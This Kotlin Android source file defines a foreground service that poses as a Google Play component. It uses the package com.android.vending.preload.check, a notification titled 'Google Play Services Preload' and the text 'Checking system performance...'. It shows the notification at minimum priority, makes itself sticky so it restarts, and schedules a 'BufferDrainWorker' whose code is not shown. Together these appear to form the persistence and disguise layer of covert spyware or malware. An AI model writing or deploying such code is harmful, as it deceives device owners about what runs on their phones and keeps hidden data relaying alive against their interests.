package com.android.vending.preload.check

import android.R
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import com.android.vending.preload.check.buffer.BufferDrainWorker

class RelayForegroundService : Service() {
    private val tag = "RelayFgService"
    private val channelId = "system_check_channel"
    private val notifId = 1337

    override fun onCreate() {
        super.onCreate()
        createChannel()
        val notification = buildNotification()
        startForeground(notifId, notification)
        BufferDrainWorker.schedule(this)
        Log.d(tag, "Foreground service started")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun buildNotification(): Notification {
        val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, channelId)
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this)
        }
        return builder
            .setContentTitle("Google Play Services Preload")
            .setContentText("Checking system performance...")
            .setSmallIcon(R.drawable.stat_sys_download)
            .setOngoing(true)
            .setPriority(Notification.PRIORITY_MIN)
            .setShowWhen(false)
            .build()
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "System Check",
                NotificationManager.IMPORTANCE_MIN,
            ).apply {
                description = "Device performance checks"
                setShowBadge(false)
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }
}
